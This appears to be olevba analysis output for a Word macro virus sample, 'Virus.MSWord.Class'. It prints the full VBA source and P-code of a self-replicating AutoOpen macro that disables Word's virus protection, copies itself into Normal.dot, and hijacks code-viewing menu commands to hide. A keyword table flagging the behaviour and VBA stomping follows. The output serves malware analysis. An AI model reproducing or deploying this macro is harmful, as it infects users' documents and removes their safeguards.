olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fb
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fb - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error GoTo out
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
If Date > #5/20/00# Then
 AutoCorrect.Entries.Add Name:=",", Value:=", áëÿ,"
End If
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
If nt > 0 And nt < 3 Then NormalTemplate.VBProject.VBComponents.Item(1).codemodule.deletelines 1
If nt > 3 And ad > 3 Then GoTo out
If nt < 3 Then
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
    host.codemodule.AddFromFile ("c:\class.sys")
    With host.codemodule
      For x = 1 To 4
       .deletelines 1
      Next x
      .replaceline 1, "Sub AutoClose()"
      .replaceline ad - 5, "Sub ViewVBCode()" '44
      .replaceline ad - 2, "Sub ToolsMacro()" '47
     End With
End If
If ad < 3 Then
 Set host = ActiveDocument.VBProject.VBComponents.Item(1)
 NormalTemplate.VBProject.VBComponents.Item(1).Export "c:\class.sys"
 host.codemodule.AddFromFile ("c:\class.sys")
 With host.codemodule
      For x = 1 To 4
       .deletelines 1
      Next x
      .replaceline 1, "Sub AutoOpen()"
      .replaceline nt - 5, "Sub ViewVBCode1()"
      .replaceline nt - 2, "Sub ToolsMacro1()"
     End With
End If
Kill "c:\class.sys"
For Each aTemp In Templates
    If LCase(aTemp.Name) = "Normal.dot" Then aTemp.Save
Next aTemp
out:
If nt > 3 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
Sub ViewVBCode1()
'123
End Sub
Sub ToolsMacro1()
'123
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Class.fb
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 3703 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	OnError out 
' Line #2:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #5:
' 	Ld Date 
' 	LitDate 0x0000 0x0000 0xE740 0x40E1 
' 	Gt 
' 	IfBlock 
' Line #6:
' 	LitStr 0x0001 ","
' 	ParamNamed New 
' 	LitStr 0x0006 ", áëÿ,"
' 	ParamNamed Value 
' 	Ld AutoCorrect 
' 	MemLd Entries 
' 	ArgsMemCall Add 0x0002 
' Line #7:
' 	EndIfBlock 
' Line #8:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St ad 
' Line #9:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St nt 
' Line #10:
' 	Ld nt 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld nt 
' 	LitDI2 0x0003 
' 	Lt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall deletelines 0x0001 
' 	EndIf 
' Line #11:
' 	Ld nt 
' 	LitDI2 0x0003 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x0003 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	Ld nt 
' 	LitDI2 0x0003 
' 	Lt 
' 	IfBlock 
' Line #13:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' Line #14:
' 	Ld host 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #15:
' 	LitStr 0x000C "c:\class.sys"
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #16:
' 	LitStr 0x000C "c:\class.sys"
' 	Paren 
' 	Ld host 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #17:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #18:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #19:
' 	LitDI2 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #20:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #21:
' 	LitDI2 0x0001 
' 	LitStr 0x000F "Sub AutoClose()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #22:
' 	Ld ad 
' 	LitDI2 0x0005 
' 	Sub 
' 	LitStr 0x0010 "Sub ViewVBCode()"
' 	ArgsMemCallWith replaceline 0x0002 
' 	QuoteRem 0x002E 0x0002 "44"
' Line #23:
' 	Ld ad 
' 	LitDI2 0x0002 
' 	Sub 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	ArgsMemCallWith replaceline 0x0002 
' 	QuoteRem 0x002E 0x0002 "47"
' Line #24:
' 	EndWith 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	Ld ad 
' 	LitDI2 0x0003 
' 	Lt 
' 	IfBlock 
' Line #27:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' Line #28:
' 	LitStr 0x000C "c:\class.sys"
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #29:
' 	LitStr 0x000C "c:\class.sys"
' 	Paren 
' 	Ld host 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #30:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #31:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #32:
' 	LitDI2 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #33:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #34:
' 	LitDI2 0x0001 
' 	LitStr 0x000E "Sub AutoOpen()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #35:
' 	Ld nt 
' 	LitDI2 0x0005 
' 	Sub 
' 	LitStr 0x0011 "Sub ViewVBCode1()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #36:
' 	Ld nt 
' 	LitDI2 0x0002 
' 	Sub 
' 	LitStr 0x0011 "Sub ToolsMacro1()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #37:
' 	EndWith 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	LitStr 0x000C "c:\class.sys"
' 	ArgsCall Kill 0x0001 
' Line #40:
' 	StartForVariable 
' 	Ld aTemp 
' 	EndForVariable 
' 	Ld Templates 
' 	ForEach 
' Line #41:
' 	Ld aTemp 
' 	MemLd New 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x000A "Normal.dot"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld aTemp 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #42:
' 	StartForVariable 
' 	Ld aTemp 
' 	EndForVariable 
' 	NextVar 
' Line #43:
' 	Label out 
' Line #44:
' 	Ld nt 
' 	LitDI2 0x0003 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #45:
' 	EndSub 
' Line #46:
' 	FuncDefn (Sub ViewVBCode1())
' Line #47:
' 	QuoteRem 0x0000 0x0003 "123"
' Line #48:
' 	EndSub 
' Line #49:
' 	FuncDefn (Sub ToolsMacro1())
' Line #50:
' 	QuoteRem 0x0000 0x0003 "123"
' Line #51:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

